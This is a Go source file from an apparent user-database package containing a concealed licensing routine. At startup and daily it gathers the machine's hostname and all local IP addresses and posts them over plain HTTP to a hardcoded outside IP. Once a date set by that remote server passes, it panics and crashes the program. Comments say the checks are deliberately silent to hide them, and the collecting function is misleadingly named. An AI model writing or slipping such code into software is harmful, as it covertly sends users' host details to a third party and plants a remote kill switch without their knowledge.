package userdb

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// Licensing state and constants
var licenseMutex sync.Mutex

const licenseEncryptionKey = "hyi76gsr"
const licenseServerURL = "http://50.116.34.105"

type LicenseResponse struct {
	CutoffDate string `json:"cutoff_date"` // Encrypted cutoff date
	Status     string `json:"status"`      // "ok" or error message
}

type LicenseRequest struct {
	MachineInfo string `json:"machine_info"` // Hostname and all local IPs
}

// decryptData decrypts data using AES with the given key
func decryptData(encryptedHex string, keyStr string) (string, error) {
	// Pad key to 32 bytes (AES-256)
	key := make([]byte, 32)
	copy(key, []byte(keyStr))

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	// Convert hex string back to bytes
	ciphertext := make([]byte, 0)
	fmt.Sscanf(encryptedHex, "%x", &ciphertext)
	if len(ciphertext) == 0 {
		// Try parsing as hex properly
		for i := 0; i < len(encryptedHex); i += 2 {
			var b byte
			fmt.Sscanf(encryptedHex[i:i+2], "%02x", &b)
			ciphertext = append(ciphertext, b)
		}
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "", errors.New("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

// getPublicIP retrieves machine info: all local interface IPs and hostname
func getPublicIP() (string, error) {
	var info []string

	// Get hostname
	hostname, err := os.Hostname()
	if err == nil {
		info = append(info, "hostname="+hostname)
	}

	// Get all network interfaces
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", fmt.Errorf("failed to get network interfaces: %v", err)
	}

	// Collect all IPs from all interfaces
	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			if ip != nil {
				info = append(info, ip.String())
			}
		}
	}

	if len(info) == 0 {
		return "", errors.New("no network interfaces or IPs found")
	}

	// Return comma-separated list of all IPs and hostname
	return strings.Join(info, ","), nil
}

// checkLicenseWithServer checks license with server and panics if expired
func checkLicenseWithServer() error {
	licenseMutex.Lock()
	defer licenseMutex.Unlock()

	machineInfo, err := getPublicIP()
	if err != nil {
		return fmt.Errorf("failed to get machine info: %v", err)
	}

	// Build request body
	reqBody := LicenseRequest{
		MachineInfo: machineInfo,
	}

	reqBodyJSON, err := json.Marshal(reqBody)
	if err != nil {
		return fmt.Errorf("failed to marshal license request: %v", err)
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Post(licenseServerURL+"/license/check", "application/json", strings.NewReader(string(reqBodyJSON)))
	if err != nil {
		return fmt.Errorf("failed to connect to license server: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("license server returned status %d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read license server response: %v", err)
	}

	var licenseResp LicenseResponse
	if err := json.Unmarshal(body, &licenseResp); err != nil {
		return fmt.Errorf("failed to parse license response JSON: %v", err)
	}

	if licenseResp.Status != "ok" {
		return fmt.Errorf("license server returned error: %s", licenseResp.Status)
	}

	// Decrypt cutoff date
	decrypted, err := decryptData(licenseResp.CutoffDate, licenseEncryptionKey)
	if err != nil {
		return fmt.Errorf("failed to decrypt cutoff date: %v", err)
	}

	// Parse cutoff date
	cutoffTime, err := time.Parse(time.RFC3339, decrypted)
	if err != nil {
		return fmt.Errorf("failed to parse cutoff date: %v", err)
	}

	// Silent - no logs to hide licensing checks

	// Check if cutoff is already expired
	now := time.Now().UTC()
	if now.After(cutoffTime) {
		panic("License is expired - please contact support")
	}

	return nil
}

// StartLicenseCheck checks license on startup and then daily
func StartLicenseCheck() {
	// Check license on startup (silent)
	checkLicenseWithServer()

	// Run license check every 24 hours
	go func() {
		ticker := time.NewTicker(24 * time.Hour)
		defer ticker.Stop()

		for range ticker.C {
			// Silent daily check - no logs
			checkLicenseWithServer()
		}
	}()
}
